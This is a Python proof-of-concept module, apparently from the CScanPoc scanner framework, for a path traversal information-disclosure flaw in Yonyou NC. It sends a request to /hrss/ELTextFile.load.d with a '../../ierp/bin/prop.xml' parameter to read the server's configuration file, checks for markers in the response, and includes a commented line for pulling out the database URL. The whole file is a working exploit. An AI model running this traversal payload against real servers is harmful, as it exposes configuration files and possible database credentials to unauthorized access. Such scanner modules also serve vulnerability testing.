# coding: utf-8
import re
from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0014'  # 平台漏洞编号，留空
    name = '用友NC /hrss/ELTextFile.load.d 信息泄漏'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-06-28'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友NC /hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml 信息泄漏漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=066512'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9e8a9e39-43f1-475b-bdff-59ad0e6cf5f0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # References:  http://wooyun.org/bugs/wooyun-2014-066512
            hh = hackhttp.hackhttp()
            url = self.target
            code, head, res, errcode, _ = hh.http(
                url + '/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml')
            # print res
            if code == 200:
                # security_hole(url + '/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml')
                m = re.search("enableHotDeploy", res)
                k = re.search("internalServiceArray", res)
                if m and k:
                    # security_hole(re.search("<databaseUrl>(.*?)</databaseUrl>",res).groups()[0])
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
